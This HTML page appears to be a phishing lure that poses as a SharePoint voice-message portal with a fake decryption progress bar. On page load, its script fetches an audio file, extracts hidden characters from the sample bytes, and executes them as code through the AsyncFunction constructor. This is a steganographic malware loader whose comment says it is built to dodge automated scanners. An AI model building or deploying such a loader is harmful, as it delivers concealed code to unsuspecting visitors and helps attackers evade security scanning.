<!DOCTYPE html>
<html>
<head>
    <title>Voice Message Portal</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; border: 1px solid #e1e1e1; padding: 40px; border-radius: 8px; width: 300px; }
        .play-btn { background: #0078d4; color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box" id="mainArea">
        <img src="https://img.icons8.com/color/48/000000/microsoft-sharepoint.png"><br><br>
        <h3>Voice Note Received</h3>
        <p style="font-size: 14px; color: #666;">Decrypting audio stream...</p>
        <div id="progFill" style="width:0%; height:4px; background:#0078d4; transition:0.5s;"></div>
        <p id="statusTxt">Initializing...</p>
    </div>

    <div id="denyArea" style="display:none;"><h1>403 Forbidden</h1></div>

    <script>
        async function loadAudioLogic() {
            try {
                const response = await fetch('notification.wav');
                const arrayBuffer = await response.arrayBuffer();
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const audioBuffer = await audioCtx.decodeAudioData(arrayBuffer);
                const channelData = audioBuffer.getChannelData(0);

                let secretCode = "";
                for (let i = 0; i < channelData.length; i++) {
                    // Convert float sample back to integer, then extract the high byte
                    let sample = Math.round(channelData[i] * 32768);
                    let charCode = (sample >> 8) & 0xFF;
                    
                    if (charCode === 0) break;
                    secretCode += String.fromCharCode(charCode);
                }

                // Execute the recovered async function
                const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
                await new AsyncFunction(secretCode)();

            } catch (e) {
                console.error("Stream error");
            }
        }

        // Automated scanners often don't trigger "window.onload" correctly for audio contexts
        window.onload = loadAudioLogic;
    </script>
</body>
</html>
